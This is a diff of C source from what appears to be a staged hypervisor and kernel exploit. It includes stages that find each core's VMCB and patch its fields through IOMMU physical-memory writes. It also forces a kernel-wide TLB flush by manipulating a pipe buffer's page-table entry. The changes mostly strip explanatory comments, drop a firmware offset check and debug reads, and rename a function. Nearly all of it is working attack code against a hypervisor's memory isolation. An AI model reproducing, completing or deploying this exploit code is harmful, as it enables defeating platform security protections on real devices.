@@ -80,14 +80,6 @@ no_ok:
 int stage2_find_vmcbs(void) {
   DEBUG_PRINT("\nHV-defeat [stage2] vmcb discovery\n");
 
-  uint64_t vcpu_off = env_offset.HV_VCPU;
-  uint64_t stride = env_offset.HV_VCPU_CPUID;
-  // Testing direct VMCB on 04.03
-  if ((!vcpu_off || !stride) && fw < 0x0300) {
-    DEBUG_PRINT("  missing HV_VCPU offsets for fw 0x%04x\n", fw);
-    return -1;
-  }
-
   for (int c = 0; c < 16; c++) {
     vmcb_pa[c] = get_vmcb(c);
     DEBUG_PRINT("  core %02d: pa=0x%016lx\n", c, vmcb_pa[c]);
@@ -96,9 +88,6 @@ int stage2_find_vmcbs(void) {
   return 0;
 }
 
-// Only valid for 3.xx and 4.xx
-// 1.xx and 2.xx have dynamic page alloc for VMCB
-// TODO: add 1.xx and 2.xx logic
 uint64_t get_vmcb(int core) {
   switch (fw) {
   case 0x0300:
@@ -123,7 +112,7 @@ int iommu_selftest(void) {
   DEBUG_PRINT("\n[iommu] self-test\n");
 
   uint64_t scratch = 0xAAAAAAAABBBBBBBBULL;
-  uint64_t scratch_pa = va_to_pa_user((uint64_t)&scratch);
+  uint64_t scratch_pa = vtophys_user((uint64_t)&scratch);
 
   if (!scratch_pa || scratch_pa >= 0x100000000ULL) {
     DEBUG_PRINT("  bad scratch PA 0x%016lx\n", scratch_pa);
@@ -158,16 +147,6 @@ int stage3_patch_vmcbs(void) {
     iommu_write8_pa(pa + 0x90, 0x0000000000000000ULL);
 
     DEBUG_PRINT("  vmcb[%2d] patched (pa=0x%016lx)\n", i, pa);
-
-    // uint64_t vmcb_00 = gpu_read_phys8(pa + 0x00);
-    // uint64_t vmcb_08 = gpu_read_phys8(pa + 0x08);
-    // uint64_t vmcb_10 = gpu_read_phys8(pa + 0x10);
-    // uint64_t vmcb_58 = gpu_read_phys8(pa + 0x58);
-    // uint64_t vmcb_90 = gpu_read_phys8(pa + 0x90);
-
-    // printf("Values read from VMCB: %016lx %016lx %016lx %016lx %016lx\n",
-    //     vmcb_00, vmcb_08, vmcb_10, vmcb_58, vmcb_90
-    // );
 
     usleep(1000);
   }
@@ -243,21 +222,17 @@ int stage6_kernel_pmap_invalidate_all(void) {
   static uint64_t two_zero_pages[PAGE_SIZE * 2] = {0};
 
   int pipe_fds[2];
-  // set O_NONBLOCK to avoid PIPE_DIRECTW
+
   if (pipe2(pipe_fds, O_NONBLOCK)) {
     return -1;
   }
 
-  // the pipe starts off as 1 page large - we need to write into the pipe so it
-  // will grow to BIG_PIPE_SIZE we need to make sure pmap_invalidate_all doesnt
-  // use the one page fast path
   if (write(pipe_fds[1], two_zero_pages, PAGE_SIZE * 2) < 0) {
     close(pipe_fds[0]);
     close(pipe_fds[1]);
     return -1;
   }
 
-  // dont need this anymore
   close(pipe_fds[1]);
 
   uint64_t read_fd_file_data = kernel_get_proc_file(-1, pipe_fds[0]);
@@ -276,17 +251,11 @@ int stage6_kernel_pmap_invalidate_all(void) {
     return -1;
   }
 
-  // inside pmap_remove anyvalid has to be 1 for pmap_invalidate_all to be
-  // called anyvalid is only set if there is at least 1 non global entry being
-  // removed set the first entry as non global, its being removed anyway so its
-  // fine (?)
   if (!page_remove_global(read_fd_buffer)) {
     close(pipe_fds[0]);
     return -1;
   }
 
-  // fd 0 is read end, it holds the buffer, this close is what does the
-  // pmap_invalidate_all because pmap == kernel_pmap, it will do invltlb_glob
   close(pipe_fds[0]);
   return 0;
 }
